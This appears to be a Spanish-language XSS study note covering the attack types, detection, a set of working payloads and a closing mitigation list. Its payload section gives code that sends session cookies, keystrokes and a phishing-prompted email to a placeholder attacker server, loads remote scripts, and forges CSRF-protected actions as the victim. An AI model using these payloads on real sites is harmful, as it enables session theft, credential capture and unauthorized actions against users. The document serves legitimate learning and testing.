# 📀 Cross-Site Scripting (XSS)


---

## ¿Qué es?

XSS permite a un atacante inyectar código JavaScript (u otro script) en una página web que luego se ejecuta en el navegador de otros usuarios. El servidor no ejecuta el código — lo ejecuta la víctima sin saberlo.

**Impacto potencial:**
- Robo de cookies de sesión / tokens JWT
- Keyloggers en el navegador
- Redireccionamiento a páginas falsas
- Acciones automatizadas en nombre del usuario (publicar, comprar, cambiar contraseña…)

---

## Tipos de XSS

**Reflected (Reflejado)** — El payload viaja en la URL o en la petición y se refleja directamente en la respuesta HTTP. No se almacena; la víctima debe hacer clic en un enlace manipulado.

**Stored (Almacenado)** — El payload se guarda en la base de datos del servidor (comentarios, perfiles, mensajes…) y se ejecuta cada vez que alguien carga esa página. El más peligroso.

**DOM-Based** — El payload se procesa en el lado cliente a través del DOM, sin pasar por el servidor. El código JavaScript de la propia página manipula el DOM de forma insegura.

---

## Detección

El payload más básico para confirmar si un campo es vulnerable:

```html
<script>alert("XSS")</script>
```

Si aparece el `alert`, el campo es vulnerable. A partir de ahí, se pueden construir ataques más elaborados.

---

## Payloads útiles

### Robo de cookie de sesión

> Requiere que la cookie **no tenga el flag `HttpOnly`** activado.

```html
<script>
    var req = new XMLHttpRequest();
    req.open('GET', 'http://TU_SERVER/?cookie=' + document.cookie);
    req.send();
</script>
```

En tu servidor (ej. con `python3 -m http.server`) verás la cookie en los logs de peticiones entrantes.

---

### Keylogger en el navegador

```html
<script>
    var k = "";
    document.onkeypress = function(e) {
        e = e || window.event;
        k += e.key;
        var i = new Image();
        i.src = "http://TU_SERVER/" + k;
    };
</script>
```

Cada pulsación de tecla se envía como una petición GET a tu servidor.

---

### Cargar un script externo

Si el campo tiene limitación de caracteres o necesitas un payload más complejo, aloja el código en un servidor y cárgalo remotamente:

```html
<script src="http://TU_SERVER/payload.js"></script>
```

Esto permite cambiar el payload sin tocar la inyección, y hace el vector más difícil de detectar.

---

### Ejemplo: formulario de phishing con JS externo

Crear el archivo `payload.js` en tu servidor:

```js
var email = prompt("Introduce tu correo para continuar:", "ejemplo@correo.com");

if (email !== null && email !== "") {
    fetch("http://TU_SERVER/log?email=" + email);
}
```

Cuando la víctima carga la página infectada, ve un prompt que parece legítimo y sus credenciales llegan a tu servidor.

---

### Acción automatizada (CSRF mediante XSS)

Útil cuando quieres que la víctima ejecute una acción en la aplicación (publicar, votar, modificar datos…) sin que lo sepa. Primero hay que identificar la petición real que realiza esa acción (con Burp Suite o las DevTools del navegador).

```js
// 1. Obtener el token CSRF de la página
var domain = "http://TARGET/nueva-publicacion";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false); // false = síncrono, espera a tener respuesta
req1.withCredentials = true;
req1.send();

var parser = new DOMParser();
var doc = parser.parseFromString(req1.responseText, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

// 2. Enviar la acción con el token obtenido
var req2 = new XMLHttpRequest();
var data = "title=test&body=test&_csrf_token=" + token;
req2.open('POST', domain, false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

---

## Mitigación

- **Escapar la salida** — Todo dato que venga del usuario y se muestre en HTML debe ser escapado (`htmlspecialchars()` en PHP, `.textContent` en lugar de `.innerHTML` en JS).
- **Content Security Policy (CSP)** — Cabecera HTTP que restringe qué scripts puede cargar y ejecutar el navegador.
- **Flag `HttpOnly` en cookies** — Impide que JavaScript pueda leer las cookies de sesión.
- **Flag `Secure` en cookies** — Solo se transmiten por HTTPS.
- **Validación de entrada** — Rechazar en servidor cualquier carácter o etiqueta no esperada. No confiar solo en la validación del lado cliente.
- **Frameworks modernos** — React, Vue, Angular escapan el contenido automáticamente por defecto. Evitar `dangerouslySetInnerHTML` o `v-html` con datos no confiables.
